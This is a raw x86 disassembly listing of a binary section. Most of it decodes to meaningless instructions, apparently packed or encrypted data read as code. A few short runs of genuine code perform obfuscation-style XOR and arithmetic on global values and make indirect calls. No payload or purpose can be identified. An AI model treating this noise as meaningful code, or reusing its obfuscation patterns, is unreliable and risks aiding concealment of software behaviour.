  403590:	jge    0x4035ed
  403592:	fmul   st,st(5)
  403594:	js     0x403552
  403596:	data16 sub al,0xf6
  403599:	cmc    
  40359a:	cmp    bl,ah
  40359c:	imul   ebx,DWORD PTR [eax+0x55],0xffffffa0
  4035a0:	hlt    
  4035a1:	inc    esi
  4035a2:	in     al,0xc0
  4035a4:	mov    edi,0xc1bab8bf
  4035a9:	lahf   
  4035aa:	add    BYTE PTR [eax-0x47bc1c16],dl
  4035b0:	ficom  DWORD PTR [ecx+0x7a]
  4035b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035b5:	jecxz  0x4035b8
  4035b7:	or     DWORD PTR [edx-0x718a5ee0],ebx
  4035bd:	out    0x1a,al
  4035bf:	aas    
  4035c0:	popf   
  4035c1:	int3   
  4035c2:	pop    edi
  4035c3:	xchg   BYTE PTR [ebx-0x6e],al
  4035c6:	ror    BYTE PTR [ecx],0xf9
  4035c9:	mov    al,0xe9
  4035cb:	dec    ecx
  4035cc:	lods   eax,DWORD PTR ds:[esi]
  4035cd:	sub    ebx,DWORD PTR [edi+0x2f975800]
  4035d3:	imul   esi,DWORD PTR [edi+0x1d0c7ac6],0x671436f
  4035dd:	nop
  4035de:	jl     0x40358e
  4035e0:	retf   
  4035e1:	std    
  4035e2:	call   0x3559:0xb69944fe
  4035e9:	mov    ebp,0x5b5c44c2
  4035ee:	mov    dl,0xed
  4035f0:	add    BYTE PTR [edi],bl
  4035f2:	sahf   
  4035f3:	cdq    
  4035f4:	pop    ecx
  4035f5:	cld    
  4035f6:	pop    esi
  4035f7:	or     DWORD PTR [edi],ebp
  4035f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035fa:	into   
  4035fb:	push   edx
  4035fc:	adc    BYTE PTR [edi+0x7e],ch
  4035ff:	ins    DWORD PTR es:[edi],dx
  403600:	sub    dh,BYTE PTR [ebp+0x6973850c]
  403606:	sbb    edx,DWORD PTR [ebp-0x7e]
  403609:	push   ecx
  40360a:	dec    edi
  40360b:	inc    DWORD PTR [edx-0x2c3a1ee7]
  403611:	xor    al,0x50
  403613:	sbb    eax,0x52524747
  403618:	pop    edi
  403619:	sub    BYTE PTR [edi-0x19cf3173],bh
  40361f:	retf   
  403620:	std    
  403621:	add    cl,ah
  403623:	mov    esp,0x127bb278
  403628:	xor    BYTE PTR [edx+eax*4],al
  40362b:	inc    ecx
  40362c:	dec    edx
  40362d:	xor    eax,0x4852d4d4
  403632:	xchg   esp,eax
  403633:	not    DWORD PTR [ebx+0x1f71d9b0]
  403639:	jp     0x403655
  40363b:	sub    edi,ebp
  40363d:	cli    
  40363e:	nop
  40363f:	test   edx,ebp
  403641:	push   ebx
  403642:	cmp    DWORD PTR [eax+esi*1],esi
  403645:	cmp    edx,DWORD PTR [esi]
  403647:	jl     0x4035dd
  403649:	in     eax,dx
  40364a:	dec    ebx
  40364b:	aam    0x6a
  40364d:	adc    BYTE PTR [eax+0x1f],cl
  403650:	cmp    eax,DWORD PTR [edi+0x64]
  403653:	outs   dx,BYTE PTR ds:[esi]
  403654:	sahf   
  403655:	jmp    0x85ca:0xbb78cfa2
  40365c:	and    eax,0x2fcca1e3
  403661:	jl     0x403624
  403663:	inc    ebp
  403664:	lahf   
  403665:	nop
  403666:	sbb    eax,0x53e55da8
  40366b:	dec    esp
  40366c:	ds int 0x13
  40366f:	and    cl,bl
  403671:	inc    esi
  403672:	mov    WORD PTR [eax],gs
  403674:	xchg   DWORD PTR [eax+0x40],ebp
  403677:	xor    edi,ebx
  403679:	lea    edx,[eax+0x13882f8a]
  40367f:	arpl   WORD PTR [edi],di
  403681:	mov    esp,0xbead2e2b
  403686:	adc    bh,BYTE PTR [ebx]
  403688:	bound  esi,QWORD PTR [eax+0x5e4bfe67]
  40368e:	push   es
  40368f:	clc    
  403690:	and    eax,0x8d52b9a4
  403695:	add    BYTE PTR [eax+0x31b6240a],cl
  40369b:	and    BYTE PTR ds:0xce39b9c8,bl
  4036a1:	ficomp DWORD PTR [edi-0x29]
  4036a4:	(bad)  
  4036a5:	and    BYTE PTR [bx+di-0x5d44],ah
  4036aa:	test   eax,0xeac28695
  4036af:	lock aad 0xdc
  4036b2:	jp     0x4036a6
  4036b4:	test   eax,0x37e79ae
  4036b9:	or     ebx,edi
  4036bb:	ds es scas eax,DWORD PTR es:[edi]
  4036be:	adc    al,0xcf
  4036c0:	dec    ecx
  4036c1:	icebp  
  4036c2:	outs   dx,DWORD PTR ds:[esi]
  4036c3:	stos   DWORD PTR es:[edi],eax
  4036c4:	mov    bh,0xd6
  4036c6:	mov    edx,0xca34712b
  4036cb:	lahf   
  4036cc:	jns    0x403704
  4036ce:	or     DWORD PTR [eax],edx
  4036d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036d1:	leave  
  4036d2:	xchg   ebp,eax
  4036d3:	loop   0x403681
  4036d5:	xor    edx,DWORD PTR [edx+0x3343864a]
  4036db:	bound  ebp,QWORD PTR [edx-0x59f797fa]
  4036e1:	sub    al,0xc6
  4036e3:	iret   
  4036e4:	mov    edx,0x2a2717a6
  4036e9:	mov    edx,DWORD PTR [edi]
  4036eb:	pop    ebp
  4036ec:	mov    ebp,eax
  4036ee:	adc    DWORD PTR [edi-0x6c225aea],esp
  4036f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036f5:	out    dx,eax
  4036f6:	cli    
  4036f7:	push   esp
  4036f8:	cld    
  4036f9:	xor    eax,DWORD PTR ds:0x1cfb7ba5
  4036ff:	leave  
  403700:	and    edx,DWORD PTR fs:[eax-0x6149393f]
  403707:	mov    ebx,0x8a992e7c
  40370d:	rcl    BYTE PTR ds:0x7c25f4e7,1
  403713:	fstp   QWORD PTR [edx]
  403715:	jbe    0x403705
  403717:	outs   dx,BYTE PTR ds:[esi]
  403718:	sbb    ebx,ebp
  40371a:	mov    dl,0xf6
  40371c:	mov    esi,0xd9beb2d9
  403721:	adc    edx,ebx
  403723:	in     al,0xf
  403725:	jae    0x4036f6
  403727:	inc    ebp
  403728:	dec    esp
  403729:	out    dx,al
  40372a:	pop    ecx
  40372b:	clc    
  40372c:	jle    0x40373a
  40372e:	out    0xc0,eax
  403730:	pop    ss
  403731:	sub    dl,ch
  403733:	or     dl,al
  403735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403736:	pop    ds
  403737:	xchg   esi,eax
  403738:	dec    ebx
  403739:	push   edi
  40373a:	mov    BYTE PTR [eax+0x28],bl
  40373d:	jbe    0x40379a
  40373f:	adc    eax,0x600c4451
  403744:	mov    dl,0x2f
  403746:	cdq    
  403747:	das    
  403748:	outs   dx,BYTE PTR ds:[esi]
  403749:	xchg   DWORD PTR [ebx],ebp
  40374b:	mov    WORD PTR [ecx+0xc055977],?
  403751:	xchg   edi,eax
  403752:	test   al,0xdc
  403754:	(bad)  
  403755:	(bad)  
  403758:	outs   dx,DWORD PTR ds:[esi]
  403759:	dec    ebp
  40375a:	pop    edx
  40375b:	mov    al,ds:0x50a8e682
  403760:	fidiv  DWORD PTR [esi-0x11e6696b]
  403766:	nop
  403767:	pop    ebp
  403768:	add    esp,DWORD PTR [esi+0x5030587c]
  40376e:	or     ecx,0x3d
  403771:	pop    ds
  403772:	xlat   BYTE PTR ds:[bx]
  403774:	aam    0x6b
  403776:	jnp    0x4037a2
  403778:	outs   dx,BYTE PTR ds:[esi]
  403779:	jb     0x403743
  40377b:	mov    ds:0x8f19d1dd,eax
  403780:	fimul  DWORD PTR [ebx+eiz*2-0x2]
  403784:	icebp  
  403785:	and    eax,0xd5860d83
  40378a:	(bad)  
  40378b:	cwde   
  40378c:	pop    ebp
  40378d:	mov    ds:0xf09c855f,eax
  403792:	stc    
  403793:	or     ebx,DWORD PTR [esi-0x7e]
  403796:	(bad)  
  403797:	sub    al,0xdb
  403799:	jnp    0x4037a3
  40379b:	in     al,dx
  40379c:	shl    BYTE PTR [ebp+0x1a3487f8],1
  4037a2:	xchg   ebx,eax
  4037a3:	mov    edx,DWORD PTR [edi+0x75]
  4037a6:	rcl    DWORD PTR [ebp-0x19],cl
  4037a9:	sbb    BYTE PTR [ebp-0x4],al
  4037ac:	sar    BYTE PTR [ebx],0xb0
  4037af:	mov    edi,0x3717f875
  4037b4:	add    dh,ch
  4037b6:	sub    esp,DWORD PTR [esi]
  4037b8:	pop    esp
  4037b9:	push   ebx
  4037ba:	pop    edi
  4037bb:	fistp  WORD PTR [ebx]
  4037bd:	int    0x41
  4037bf:	pop    eax
  4037c0:	adc    DWORD PTR [edi],esp
  4037c2:	dec    edx
  4037c3:	push   esp
  4037c4:	ins    BYTE PTR es:[edi],dx
  4037c5:	sub    bl,dl
  4037c7:	push   ss
  4037c8:	jns    0x403849
  4037ca:	stos   BYTE PTR es:[edi],al
  4037cb:	jae    0x403787
  4037cd:	push   edi
  4037ce:	mov    ch,0xc4
  4037d0:	out    dx,al
  4037d1:	dec    esp
  4037d2:	add    BYTE PTR [ebp+0x6493a141],0x8
  4037d9:	enter  0xfda0,0x3
  4037dd:	inc    edx
  4037de:	fstp   TBYTE PTR [ebx]
  4037e0:	mov    eax,ds:0xbe21eee9
  4037e5:	pop    edi
  4037e6:	or     al,0x23
  4037e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037e9:	dec    edx
  4037ea:	mov    esi,DWORD PTR [edx]
  4037ec:	mov    DWORD PTR [esi],esp
  4037ee:	aaa    
  4037ef:	loope  0x403870
  4037f1:	dec    ebp
  4037f2:	jp     0x403855
  4037f4:	push   0x63036cf1
  4037f9:	mov    eax,0xd33f0d49
  4037fe:	mov    DWORD PTR [edi+0x525e654d],eax
  403804:	je     0x40384c
  403806:	dec    esp
  403807:	popf   
  403808:	fadd   QWORD PTR [ecx+0x3b]
  40380b:	test   eax,0x39b648a8
  403810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403811:	and    edx,ebx
  403813:	adc    BYTE PTR [edi],ch
  403815:	sbb    eax,0x89546619
  40381a:	sub    esi,DWORD PTR [ebx+0x22]
  40381d:	retf   0x4089
  403820:	jge    0x403818
  403822:	mov    bh,0x58
  403824:	mov    esp,DWORD PTR [edx-0x61886249]
  40382a:	int3   
  40382b:	addr16 pusha 
  40382d:	push   ebx
  40382e:	mov    ch,0x4c
  403830:	xlat   BYTE PTR ds:[ebx]
  403831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403832:	cs adc eax,0xc335ae68
  403838:	sub    bl,0x17
  40383b:	mov    BYTE PTR [esi],al
  40383d:	mov    al,ds:0x8a551f40
  403842:	sbb    eax,0x52b88c7f
  403847:	mov    dl,0xff
  403849:	push   cs
  40384a:	mov    BYTE PTR [edi-0x2ae565f],bl
  403850:	xchg   BYTE PTR [eax+0x5a54109b],dh
  403856:	push   0x8d9b6d5b
  40385b:	dec    eax
  40385c:	cmp    BYTE PTR [ebp+0x7e],cl
  40385f:	aad    0xb2
  403861:	sbb    al,0xc5
  403863:	(bad)  
  403864:	mov    ah,0x3b
  403866:	ret    0x148
  403869:	xor    cl,ch
  40386b:	xchg   BYTE PTR [edi-0x15],dl
  40386e:	test   al,0xa3
  403870:	gs adc eax,0xe127a979
  403876:	inc    ebx
  403877:	mul    ecx
  403879:	and    BYTE PTR [esi],ch
  40387b:	push   0xffffff9b
  40387d:	test   al,0x8d
  40387f:	mov    esi,DWORD PTR [ecx+edi*2-0x4c]
  403883:	jl     0x40385b
  403885:	inc    ebp
  403886:	cli    
  403887:	stc    
  403888:	rcl    BYTE PTR [edi-0x255ec9b3],cl
  40388e:	and    DWORD PTR [ecx+ebp*8-0x5b],ecx
  403892:	mov    ds:0xe45be12b,al
  403897:	inc    esp
  403898:	pop    ebp
  403899:	adc    BYTE PTR [esp+ebx*8-0xf],dh
  40389d:	inc    esp
  40389e:	jnp    0x403846
  4038a0:	cmp    eax,0x63a1521
  4038a5:	adc    eax,0x49bb8ada
  4038aa:	hlt    
  4038ab:	add    eax,0x76720bb8
  4038b0:	mov    ecx,DWORD PTR [ebp+0x69b51842]
  4038b6:	push   ebx
  4038b7:	push   ebp
  4038b8:	cmp    edi,DWORD PTR [esi+0x66]
  4038bb:	push   ecx
  4038bc:	add    bl,BYTE PTR [edx+0x6a79f5ef]
  4038c2:	ins    DWORD PTR es:[edi],dx
  4038c3:	lock pop esp
  4038c5:	push   ds
  4038c6:	add    al,0x42
  4038c8:	lds    edi,FWORD PTR [edx+eiz*4+0xb80b561]
  4038cf:	jmp    0x3fa4b452
  4038d4:	fs call 0x2968ffce
  4038da:	xchg   ebx,eax
  4038db:	push   es
  4038dc:	xchg   edx,eax
  4038dd:	test   eax,0x83bebbfc
  4038e2:	ret    0x7b57
  4038e5:	shrd   ecx,edx,0x2
  4038e9:	xor    DWORD PTR ds:0x4284c5,0x428575
  4038f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4038f6:	mov    ecx,DWORD PTR [ebp+0x18]
  4038f9:	xor    DWORD PTR ds:0x428459,0x428581
  403903:	xor    DWORD PTR [ebp-0x1c],edi
  403906:	adc    DWORD PTR ds:0x428445,0x4aad
  403910:	shl    ecx,0x1e
  403913:	not    DWORD PTR ds:0x42840d
  403919:	xor    ecx,ecx
  40391b:	sub    DWORD PTR ds:0x428559,0x450d
  403925:	or     ecx,DWORD PTR [ebp-0x1c]
  403928:	jmp    0x403cc9
  40392d:	cdq    
  40392e:	jbe    0x40398b
  403930:	fidivr WORD PTR [ebx+eiz*8-0x40084545]
  403937:	mul    BYTE PTR [ecx+ebx*2-0x421c180d]
  40393e:	in     eax,dx
  40393f:	mov    esi,0xbec4bdbe
  403944:	mov    esi,0x9461a2e5
  403949:	int3   
  40394a:	ja     0x403962
  40394c:	out    dx,al
  40394d:	dec    ebx
  40394e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40394f:	mov    dl,0xae
  403951:	cwde   
  403952:	sbb    BYTE PTR [ecx],0xda
  403955:	jmp    0x40392b
  403957:	push   eax
  403958:	and    bl,BYTE PTR [esi+0x58de0b94]
  40395e:	mov    WORD PTR [edx+0x68],cs
  403961:	adc    al,0x9f
  403963:	aam    0x6a
  403965:	(bad)  
  403966:	aad    0x4b
  403968:	adc    BYTE PTR [eax+0xa658f4],bh
  40396e:	out    dx,al
  40396f:	out    0xef,eax
  403971:	xor    eax,0x750c6e02
  403976:	in     al,dx
  403977:	ficomp DWORD PTR [ebx+0x29]
  40397a:	jno    0x403945
  40397c:	jnp    0x403918
  40397e:	popa   
  40397f:	jbe    0x40390b
  403981:	jne    0x403918
  403983:	retf   0xc51
  403986:	rcl    DWORD PTR [eax],0xd5
  403989:	ss cli 
  40398b:	xor    al,0x61
  40398d:	scas   eax,DWORD PTR es:[edi]
  40398e:	rcr    DWORD PTR [esi],1
  403990:	or     al,BYTE PTR [eax+0x1f]
  403993:	cdq    
  403994:	mov    dh,0x51
  403996:	adc    DWORD PTR [edi],edx
  403998:	xor    DWORD PTR [ebx+0x1ef3b6d6],edx
  40399e:	fidivr WORD PTR [esi]
  4039a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039a1:	and    BYTE PTR [eax+0x28],dh
  4039a4:	xor    BYTE PTR [edi],bl
  4039a6:	push   ss
  4039a7:	xchg   esp,eax
  4039a8:	jns    0x403992
  4039aa:	das    
  4039ab:	xchg   edi,eax
  4039ac:	xchg   ecx,eax
  4039ad:	mov    dl,0xa2
  4039af:	or     eax,0x6ece4942
  4039b4:	lods   eax,DWORD PTR ds:[esi]
  4039b5:	mov    gs,WORD PTR [edx+0x5e598c9a]
  4039bb:	ret    
  4039bc:	enter  0x2e63,0x82
  4039c0:	shr    DWORD PTR [esi+0x2590d4b5],0xd8
  4039c7:	(bad)  
  4039c8:	dec    edx
  4039c9:	fstp   DWORD PTR [ecx+0x2daa998]
  4039cf:	mov    dl,0xfa
  4039d1:	pop    edi
  4039d2:	icebp  
  4039d3:	dec    ecx
  4039d4:	cmp    BYTE PTR [edx+0x260f9fdf],cl
  4039da:	ja     0x403a46
  4039dc:	mov    dh,BYTE PTR [ecx]
  4039de:	ficom  DWORD PTR [edi]
  4039e0:	and    dl,BYTE PTR [ebx+0x645c974e]
  4039e6:	dec    ebx
  4039e7:	push   0x11
  4039e9:	dec    esp
  4039ea:	(bad)  
  4039eb:	in     eax,0x9e
  4039ed:	xor    al,0x5f
  4039ef:	bnd ja 0x4039c2
  4039f2:	jge    0x403a70
  4039f4:	icebp  
  4039f5:	mov    ebx,DWORD PTR [ecx]
  4039f7:	mov    cl,0xed
  4039f9:	xor    BYTE PTR [ecx+0xc],0x58
  4039fd:	pushf  
  4039fe:	test   al,bl
  403a00:	dec    ebp
  403a01:	xchg   ebx,eax
  403a02:	pop    eax
  403a03:	shl    BYTE PTR ds:0xf3966aea,cl
  403a09:	lock leave 
  403a0b:	pop    ebx
  403a0c:	jo     0x4039e1
  403a0e:	enter  0x50b1,0xd
  403a12:	fisttp DWORD PTR [edi+0x643e4f9e]
  403a18:	inc    esp
  403a19:	pop    esp
  403a1a:	mov    esp,0xe64ba9f9
  403a1f:	jp     0xb0e16b13
  403a25:	fstp   st(6)
  403a27:	push   cs
  403a28:	ret    
  403a29:	ds test eax,0x5002fba9
  403a2f:	push   ss
  403a30:	jne    0x403a19
  403a32:	xchg   edx,eax
  403a33:	fisub  DWORD PTR [edi-0x1b6a2995]
  403a39:	cld    
  403a3a:	adc    eax,0xc81268ba
  403a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a40:	shr    DWORD PTR [edi+edx*4],1
  403a43:	mov    dh,0x22
  403a45:	(bad)  
  403a47:	pop    ds
  403a48:	cmp    DWORD PTR [edx-0x3770dea0],edx
  403a4e:	add    BYTE PTR [eax-0x64d118f2],dl
  403a54:	mov    ds:0x78b0a20b,eax
  403a59:	inc    eax
  403a5a:	jmp    0x403ad4
  403a5c:	fucomp st(0)
  403a5e:	outs   dx,DWORD PTR ds:[esi]
  403a5f:	dec    ebp
  403a60:	xor    eax,0xea0cf3db
  403a65:	inc    ebx
  403a66:	std    
  403a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a68:	es jo  0x403a6c
  403a6b:	lea    eax,[eax]
  403a6d:	push   edx
  403a6e:	pop    eax
  403a6f:	and    eax,0x60570a5f
  403a74:	fbstp  TBYTE PTR [ebp+0x38]
  403a77:	arpl   WORD PTR [edx],bx
  403a79:	pop    esi
  403a7a:	jb     0x403aae
  403a7c:	pop    esp
  403a7d:	(bad)  [ebp+0x3aa72b45]
  403a83:	mov    esp,0x646e75a7
  403a88:	jmp    0x403a3b
  403a8a:	jmp    0x356b:0xae22d5c4
  403a91:	add    al,0xa5
  403a93:	out    dx,al
  403a94:	(bad)  
  403a95:	aam    0xac
  403a97:	bound  ebx,QWORD PTR [esi]
  403a99:	bound  ebx,QWORD PTR [edi-0x6ad1b80c]
  403a9f:	dec    edx
  403aa0:	retf   0x3615
  403aa3:	aaa    
  403aa4:	dec    edx
  403aa5:	cs sbb eax,0x7c62f44a
  403aab:	sub    BYTE PTR [edx+0x60e7fc3f],bh
  403ab1:	mov    BYTE PTR [edi+0x408f78c3],dh
  403ab7:	rcl    BYTE PTR [ecx+0xf],0x3e
  403abb:	inc    edx
  403abc:	aas    
  403abd:	arpl   WORD PTR [eax+0x5ed0a345],dx
  403ac3:	(bad)  [edi+0xe]
  403ac6:	cmp    DWORD PTR [ecx+0x5e8cae28],0xe453f7f7
  403ad0:	jle    0x403b49
  403ad2:	fiadd  DWORD PTR ds:0x3e48e99f
  403ad8:	call   0x4400077
  403add:	xchg   ebx,eax
  403ade:	rol    BYTE PTR [ecx-0x5b],1
  403ae1:	mov    ds:0xc3b72faf,al
  403ae6:	mov    ebp,0xfec07101
  403aeb:	cwde   
  403aec:	or     ebx,edx
  403aee:	call   0x76ed:0xad22fb1e
  403af5:	and    BYTE PTR [edx+0x21],ah
  403af8:	shl    BYTE PTR [ebx],0xe7
  403afb:	xchg   edx,eax
  403afc:	aam    0xd1
  403afe:	dec    ebp
  403aff:	push   ecx
  403b00:	(bad)  
  403b01:	pop    edx
  403b02:	adc    DWORD PTR [edx],esi
  403b04:	hlt    
  403b05:	adc    DWORD PTR [ecx],ebp
  403b07:	cli    
  403b08:	shl    al,0x6c
  403b0b:	in     eax,0x12
  403b0d:	shl    BYTE PTR [esi],1
  403b0f:	and    BYTE PTR [edx-0x3e],bl
  403b12:	aad    0xc6
  403b14:	bound  eax,QWORD PTR [ecx+0x39f14d68]
  403b1a:	inc    edx
  403b1b:	out    0xb4,al
  403b1d:	cmp    DWORD PTR [ebp-0x4f],edx
  403b20:	adc    dh,BYTE PTR [esi+0x45b382a2]
  403b26:	mov    bh,0x10
  403b28:	mov    edx,0x520b1b0
  403b2d:	or     al,0x1
  403b2f:	not    BYTE PTR [ecx-0x27]
  403b32:	div    DWORD PTR [ebx]
  403b34:	cwde   
  403b35:	sbb    DWORD PTR [ebp-0x1f],0x696bce1f
  403b3c:	mov    cl,0xa7
  403b3e:	push   ds
  403b3f:	daa    
  403b40:	mov    dl,0xb4
  403b42:	xchg   edx,eax
  403b43:	in     al,dx
  403b44:	xchg   WORD PTR [ebp+0x5103e19a],ax
  403b4b:	and    eax,0x14fef554
  403b50:	jmp    0xadf04a84
  403b55:	dec    esi
  403b56:	fdivr  DWORD PTR [edx+0x73]
  403b59:	adc    ebx,DWORD PTR [ecx+ebx*4+0x2c]
  403b5d:	or     eax,0xf99efc0e
  403b62:	nop
  403b63:	adc    al,0xe2
  403b65:	les    edi,FWORD PTR [edx-0x74]
  403b68:	out    0xcd,eax
  403b6a:	aas    
  403b6b:	sbb    BYTE PTR [ecx-0x33],dl
  403b6e:	addr16 jne 0x403bbe
  403b71:	loopne 0x403b07
  403b73:	dec    esp
  403b74:	xor    edi,DWORD PTR [esi]
  403b76:	fsubr  QWORD PTR [edi]
  403b78:	push   esp
  403b79:	ins    BYTE PTR es:[edi],dx
  403b7a:	mov    eax,ds:0x1ac757eb
  403b7f:	cld    
  403b80:	outs   dx,BYTE PTR ds:[esi]
  403b81:	sub    BYTE PTR [esi+ecx*4-0x72],0x22
  403b86:	xchg   esi,eax
  403b87:	sbb    DWORD PTR [eax+0x33],edi
  403b8a:	lods   al,BYTE PTR ds:[esi]
  403b8b:	(bad)  
  403b8c:	xor    DWORD PTR [esi+0x556fba98],edi
  403b92:	adc    ah,BYTE PTR [edx]
  403b94:	fcmovne st,st(4)
  403b96:	sbb    ah,dl
  403b98:	jg     0x403c0a
  403b9a:	mov    eax,ds:0x869d1455
  403b9f:	xchg   ebp,eax
  403ba0:	inc    esi
  403ba1:	popa   
  403ba2:	movups xmm4,XMMWORD PTR [eax-0x7e110a00]
  403ba9:	fnstsw WORD PTR es:[ecx-0x57]
  403bad:	int    0xea
  403baf:	ins    DWORD PTR es:[edi],dx
  403bb0:	aad    0xe3
  403bb2:	sub    al,0xe2
  403bb4:	and    bl,bl
  403bb6:	sahf   
  403bb7:	sti    
  403bb8:	lock xor DWORD PTR [eax],ebx
  403bbb:	push   ebp
  403bbc:	test   al,0xf1
  403bbe:	sub    eax,0x4f9bba32
  403bc3:	jns    0x403b72
  403bc5:	dec    edx
  403bc6:	adc    BYTE PTR [eax-0x30],ah
  403bc9:	cmp    edx,DWORD PTR [edx-0x25]
  403bcc:	pop    esi
  403bcd:	push   0xffffff88
  403bcf:	adc    BYTE PTR [eax-0x14],0x14
  403bd3:	ret    
  403bd4:	(bad)  
  403bd5:	fisub  WORD PTR [ebx]
  403bd7:	mov    bl,0x2f
  403bd9:	cmp    BYTE PTR [ebx+0x38e72801],bl
  403bdf:	or     eax,0x16600d0e
  403be4:	cmp    BYTE PTR [esi-0x6d03ced9],0xf0
  403beb:	pop    ebp
  403bec:	mov    ah,0x5e
  403bee:	mov    ebp,0x35052d37
  403bf3:	das    
  403bf4:	out    dx,eax
  403bf5:	jnp    0x403c1b
  403bf7:	push   esi
  403bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bf9:	push   esp
  403bfa:	xlat   BYTE PTR ds:[ebx]
  403bfb:	jae    0x403c71
  403bfd:	mov    ebx,0x9cc7b91e
  403c02:	mov    ah,0x4
  403c04:	fsubr  st(6),st
  403c06:	mov    al,ch
  403c08:	mov    eax,0xb57475f0
  403c0d:	inc    ecx
  403c0e:	sar    BYTE PTR [eax],cl
  403c10:	pop    eax
  403c11:	cdq    
  403c12:	xchg   ecx,eax
  403c13:	pop    eax
  403c14:	push   es
  403c15:	mov    BYTE PTR [edi+0xf],bh
  403c18:	cmp    ch,al
  403c1a:	int    0x4
  403c1c:	test   BYTE PTR [ebp-0x2efb3c20],cl
  403c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c23:	jnp    0x403c45
  403c25:	ss mov esp,0x4fd0b0ee
  403c2b:	adc    al,dh
  403c2d:	mov    DWORD PTR [ebp-0x8cb1ed0],esp
  403c33:	cli    
  403c34:	push   esp
  403c35:	or     bl,bh
  403c37:	leave  
  403c38:	mov    BYTE PTR [esi+ecx*2+0x33d7f920],ch
  403c3f:	jmp    0x1c9ce2f5
  403c44:	mov    edi,0xb37b3d32
  403c49:	pop    eax
  403c4a:	xor    edx,DWORD PTR [edi+0x44]
  403c4d:	mov    bl,al
  403c4f:	mov    ds:0x3dc20527,eax
  403c54:	push   esi
  403c55:	cmp    DWORD PTR [ecx-0x73],esi
  403c58:	pop    esi
  403c59:	pop    ss
  403c5a:	push   cs
  403c5b:	jne    0x403cc5
  403c5d:	fsub   st,st(4)
  403c5f:	dec    edi
  403c60:	jo     0x403bf2
  403c62:	icebp  
  403c63:	stos   DWORD PTR es:[edi],eax
  403c64:	adc    eax,0x6de2e572
  403c69:	mov    ds:0x132555da,eax
  403c6e:	in     eax,0xe7
  403c70:	and    eax,0x4d4efbec
  403c75:	dec    edx
  403c76:	cli    
  403c77:	leave  
  403c78:	push   0x5b337fb4
  403c7d:	xor    ecx,ebx
  403c7f:	and    esi,DWORD PTR [ecx+0x6b]
  403c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c84:	(bad)  
  403c85:	clc    
  403c86:	jl     0x403cc7
  403c88:	jne    0x403cb7
  403c8a:	pop    ebp
  403c8b:	pop    ebp
  403c8c:	jg     0x403ca3
  403c8e:	add    DWORD PTR [ebx+esi*1],edx
  403c91:	push   esp
  403c92:	in     al,dx
  403c93:	outs   dx,DWORD PTR ds:[esi]
  403c94:	inc    edi
  403c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c96:	test   DWORD PTR [edx-0x67],ecx
  403c99:	or     al,0xf4
  403c9b:	fdivr  QWORD PTR [ebp-0x65]
  403c9e:	and    BYTE PTR ds:0x2f99bc9,bh
  403ca4:	push   edx
  403ca5:	sub    al,BYTE PTR [ebx-0x427ee37f]
  403cab:	mov    cl,0x9c
  403cad:	mov    bl,0x76
  403caf:	inc    edi
  403cb0:	or     eax,0x850d5082
  403cb5:	and    al,0xe0
  403cb7:	pop    eax
  403cb8:	data16 js 0x403c7d
  403cbb:	sub    ebx,edx
  403cbd:	cmp    DWORD PTR [edi-0x78046e08],edi
  403cc3:	shr    DWORD PTR [ebx-0x19],0x56
  403cc7:	mov    ?,WORD PTR [edx-0x3f]
  403cca:	jmp    0x8411:0x15b70f02
  403cd1:	inc    edx
  403cd2:	add    BYTE PTR [ecx],ah
  403cd4:	adc    eax,0x42840d
  403cd9:	mov    edx,DWORD PTR [ebp+0x1c]
  403cdc:	cmp    DWORD PTR ds:0x428475,0x0
  403ce3:	mov    edx,0xb30
  403ce8:	not    DWORD PTR ds:0x42833d
  403cee:	jmp    0x403db9
  403cf3:	mov    DWORD PTR ds:0x428341,0x7955
  403cfd:	mov    DWORD PTR ds:0x4284cd,0x3fbe
  403d07:	cmp    DWORD PTR ds:0x428475,0x0
  403d0e:	jae    0x403d49
  403d14:	push   0x2165
  403d19:	push   0x209b
  403d1e:	push   0x61ab
  403d23:	push   0x585a
  403d28:	push   DWORD PTR [ebp-0x14]
  403d2b:	call   DWORD PTR ds:0x42e0c0
  403d31:	xor    DWORD PTR ds:0x42840d,edi
  403d37:	xor    DWORD PTR ds:0x428419,edi
  403d3d:	xor    edx,DWORD PTR ds:0x428479
  403d43:	sub    DWORD PTR ds:0x428365,edi
  403d49:	sbb    DWORD PTR ds:0x428481,0x3090
  403d53:	sub    DWORD PTR ds:0x428431,ecx
  403d59:	xor    DWORD PTR ds:0x4284dd,edi
  403d5f:	cmp    DWORD PTR ds:0x42854d,0x0
  403d66:	mov    edx,0x71bd
  403d6b:	not    edx
  403d6d:	jmp    0x403db9
  403d72:	mov    edx,0x37a5
  403d77:	mov    edx,0x5337
  403d7c:	cmp    DWORD PTR ds:0x42854d,0x0
  403d83:	jle    0x403dad
  403d89:	push   0x428445
  403d8e:	call   DWORD PTR ds:0x42e0c4
  403d94:	mov    edx,DWORD PTR ds:0x428521
  403d9a:	mov    edx,DWORD PTR [edx]
  403d9c:	and    DWORD PTR ds:0x42832d,edx
  403da2:	adc    DWORD PTR ds:0x428429,0x11e9
  403dac:	dec    edx
  403dad:	and    edx,0xf08
  403db3:	sub    edx,DWORD PTR ds:0x428571
  403db9:	mov    DWORD PTR [ebp-0x2c],ecx
  403dbc:	mov    ecx,DWORD PTR [esi]
  403dbe:	add    DWORD PTR ds:0x428445,ebx
  403dc4:	mov    edx,DWORD PTR [esi+0x4]
  403dc7:	or     DWORD PTR ds:0x428335,0x428349
